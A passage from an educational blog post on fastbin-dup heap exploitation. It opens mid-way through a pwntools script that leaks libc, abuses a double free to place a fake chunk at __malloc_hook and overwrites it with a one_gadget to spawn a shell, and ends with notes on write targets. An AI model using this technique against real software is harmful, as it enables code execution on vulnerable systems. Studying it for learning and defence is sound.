	<span class="nf">ru</span><span class="p">(</span><span class="sh">"</span><span class="s">leak = </span><span class="sh">"</span><span class="p">)</span>
	<span class="n">printf</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="nf">rl</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
	<span class="nf">print_leak</span><span class="p">(</span><span class="sh">"</span><span class="s">printf </span><span class="sh">"</span><span class="p">,</span> <span class="n">printf</span><span class="p">)</span>

	<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">printf</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">printf</span><span class="sh">"</span><span class="p">]</span>
	<span class="nf">print_leak</span><span class="p">(</span><span class="sh">"</span><span class="s">libc base address</span><span class="sh">"</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">)</span>

	<span class="n">malloc_hook</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">__malloc_hook</span><span class="sh">'</span><span class="p">]</span>
	<span class="nf">print_leak</span><span class="p">(</span><span class="sh">"</span><span class="s">__malloc_hook</span><span class="sh">"</span><span class="p">,</span> <span class="n">malloc_hook</span><span class="p">)</span>

	<span class="n">one_gadget</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0xf1247</span>
	<span class="nf">print_leak</span><span class="p">(</span><span class="sh">"</span><span class="s">one gadget</span><span class="sh">"</span><span class="p">,</span> <span class="n">one_gadget</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">=</span> <span class="nf">flat</span><span class="p">(</span>
		<span class="nf">cyclic</span><span class="p">(</span><span class="mh">0x13</span><span class="p">),</span> <span class="c1"># padding to __malloc_hook
</span>		<span class="n">one_gadget</span>
	<span class="p">)</span>
	<span class="c1">#print_leak("payload ", payload)
</span>
	<span class="n">size</span> <span class="o">=</span> <span class="mh">0x60</span>
	<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">We will malloc chunks of size: </span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>

	<span class="c1"># double free
</span>
	<span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>
	<span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>

	<span class="nf">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
	<span class="nf">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
	<span class="nf">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

	<span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="c1"># 2 | same as 0
</span>	<span class="c1">#target = (malloc_hook - 35 + 16) - 0x200000
</span>	<span class="n">target</span> <span class="o">=</span> <span class="n">malloc_hook</span> <span class="o">-</span> <span class="mi">35</span> 
	<span class="nf">print_leak</span><span class="p">(</span><span class="sh">"</span><span class="s">target</span><span class="sh">"</span><span class="p">,</span> <span class="n">target</span><span class="p">)</span>
	<span class="nf">get_data</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="nf">p64</span><span class="p">(</span><span class="n">target</span><span class="p">))</span>


	<span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="c1"># 3 | same as 1
</span>	<span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="c1"># 4 | same as 0
</span>	<span class="nf">get_data</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">AAAA</span><span class="sh">"</span><span class="p">)</span>
	<span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="c1"># 5 enter one
</span>
	<span class="nf">get_data</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
	<span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>

</pre></td></tr></tbody></table></code></div></div>

<p>This gets has a shell.</p>

<p><a href="/assets/images/pwn/fastbin_dup/shell2.png" class="popup img-link shimmer"><img src="/assets/images/pwn/fastbin_dup/shell2.png" alt="Arbitrary Write" loading="lazy"></a></p>

<p>The reason why we request chunks of size 92 earlier is because we want the those chunks to belong to the <code class="language-plaintext highlighter-rouge">0x70 fastbin</code>, which is the same <code class="language-plaintext highlighter-rouge">fastbin</code> that the our fake chunk near <code class="language-plaintext highlighter-rouge">__malloc_hook</code> will be placed in if it was freed (<code class="language-plaintext highlighter-rouge">0x7f</code> in this case). This is done so that chunk can have the correct size.</p>
<h2 id="write-targets"><span class="me-2">Write Targets</span><a href="#write-targets" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p>So which targets would we wish to overwrite?</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">__free_hook</code></li>
  <li><code class="language-plaintext highlighter-rouge">__malloc_hook</code></li>
  <li>Global Offset Table (GOT)</li>
</ul>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/notes/">notes</a>,
          <a href="/categories/heap-exploitation/">heap-exploitation</a>
      </div>
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/fastbin-dup/"
            class="post-tag no-text-decoration"
          >fastbin-dup</a>
        
          <a
            href="/tags/fastbin/"
            class="post-tag no-text-decoration"
          >fastbin</a>
        
          <a
            href="/tags/heap-exploitation/"
            class="post-tag no-text-decoration"
          >heap-exploitation</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=Fastbin%20Exploitation%20-%20tibane&url=https%3A%2F%2Ftibane0.github.io%2Fpost%2FFastbin-dup%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=Fastbin%20Exploitation%20-%20tibane&u=https%3A%2F%2Ftibane0.github.io%2Fpost%2FFastbin-dup%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=https%3A%2F%2Ftibane0.github.io%2Fpost%2FFastbin-dup%2F&text=Fastbin%20Exploitation%20-%20tibane" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">Recently Updated</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/post/unlink-exploit/">Unlink Exploit</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/post/qnqsec-debtors-database/">QNQSEC Debtor's Database Writeup</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/post/information-leaks/">Information Disclosure</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/post/Fastbin-dup/">Fastbin Exploitation</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/post/srop/">Sigreturn Oriented Programming</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/fastbin-dup/">fastbin-dup</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/fastbin/">fastbin</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/gambling/">gambling</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/heap-exploitation/">heap-exploitation</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/info-leak/">info-leak</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/protostar-stack/">protostar-stack</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/pwn-env/">pwn-env</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ret2gets/">ret2gets</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/srop/">srop</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/stack-canary/">stack-canary</a>
      
    </div>
  </section>


            </div>

            
              
              






  <div class="toc-border-cover z-3"></div>
  <section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4">
    <h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->















  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
    
  

  

  

  

  

  

  

  

  

  

  

  











  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/post/tcache-poisioning/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1758751200"
  data-df="ll"
  
>
  Sep 25, 2025
</time>

              <h4 class="pt-0 my-2">Tcache Poisioning</h4>
              <div class="text-muted">
                <p>Understanding Tcache  Thread Local Caching (Tcache) is a set of bins, organised as singly-linked lists, that are local to each thread. Tcache was made to avoid the need to lock a global arena for f...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/post/unlink-exploit/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1757196000"
  data-df="ll"
  
>
  Sep  7, 2025
</time>

              <h4 class="pt-0 my-2">Unlink Exploit</h4>
              <div class="text-muted">
                <p>Understanding how unlinking happens in libc (old and modern)  and how to exploit it</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/post/srop/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1760306400"
  data-df="ll"
  
>
  Oct 13, 2025
</time>

              <h4 class="pt-0 my-2">Sigreturn Oriented Programming</h4>
              <div class="text-muted">
                <p>Sigreturn Oriented Programming.  SROP (Sigreturn Oriented Programming) is binary exploitation technique that leverages the signal handling mechanisms in POSIX systems to gain control over CPU regis...</p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/post/information-leaks/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>Information Disclosure</p>
    </a>
  

  
    <a
      href="/post/UDA/"
      class="btn btn-outline-primary"
      aria-label="Newer"
    >
      <p>Uninitialized Data Access</p>
    </a>
  
</nav>

            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>©
    <time>2025</time>

    
      <a href="https://twitter.com/tibane101">Nkateko Tibane</a>.
    

    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
      >Some rights reserved.</span>
    
  </p>

  <p>Using the <a
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="v7.3.0"
        href="https://github.com/cotes2020/jekyll-theme-chirpy"
        target="_blank"
        rel="noopener"
      >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center d-none">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/fastbin-dup/">fastbin-dup</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/fastbin/">fastbin</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/gambling/">gambling</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/heap-exploitation/">heap-exploitation</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/info-leak/">info-leak</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/protostar-stack/">protostar-stack</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/pwn-env/">pwn-env</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ret2gets/">ret2gets</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/srop/">srop</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/stack-canary/">stack-canary</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- Embedded scripts -->

    
      
      <!-- The comments switcher -->

  
  <!-- https://giscus.app/ -->
<script>
  (function () {
    const themeMapper = Theme.getThemeMapper('light', 'dark_dimmed');
    const initTheme = themeMapper[Theme.visualState];

    let lang = 'en';if (lang.length > 2 && !lang.startsWith('zh')) {
      lang = lang.slice(0, 2);
    }

    let giscusAttributes = {
      src: 'https://giscus.app/client.js',
      'data-repo': 'tibane0/tibane0.github.io',
      'data-repo-id': 'R_kgDOOv_aMg',
      'data-category': 'General',
      'data-category-id': 'DIC_kwDOOv_aMs4CqjgI',
      'data-mapping': 'pathname',
      'data-strict' : '0',
      'data-reactions-enabled': '1',
      'data-emit-metadata': '0',
      'data-theme': initTheme,
      'data-input-position': 'bottom',
      'data-lang': lang,
      'data-loading': 'lazy',
      crossorigin: 'anonymous',
      async: ''
    };

    let giscusNode = document.createElement('script');
    Object.entries(giscusAttributes).forEach(([key, value]) =>
      giscusNode.setAttribute(key, value)
    );

    const $footer = document.querySelector('footer');
    $footer.insertAdjacentElement("beforebegin", giscusNode);

    addEventListener('message', (event) => {
      if (event.source === window && event.data && event.data.id === Theme.ID) {
        const newTheme = themeMapper[Theme.visualState];

        const message = {
          setConfig: {
            theme: newTheme
          }
        };

        const giscus =
          document.getElementsByClassName('giscus-frame')[0].contentWindow;
        giscus.postMessage({ giscus: message }, 'https://giscus.app');
      }
    });
  })();
</script>



    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  
  document.addEventListener('DOMContentLoaded', () => {
    SimpleJekyllSearch({
      searchInput: document.getElementById('search-input'),
      resultsContainer: document.getElementById('search-results'),
      json: '/assets/js/data/search.json',
      searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{content}</p>  </article>',
      noResultsText: '<p class="mt-5">Oops! No results found.</p>',
      templateMiddleware: function(prop, value, template) {
        if (prop === 'categories') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
          }
        }

        if (prop === 'tags') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
          }
        }
      }
    });
  });
</script>

  </body>
</html>

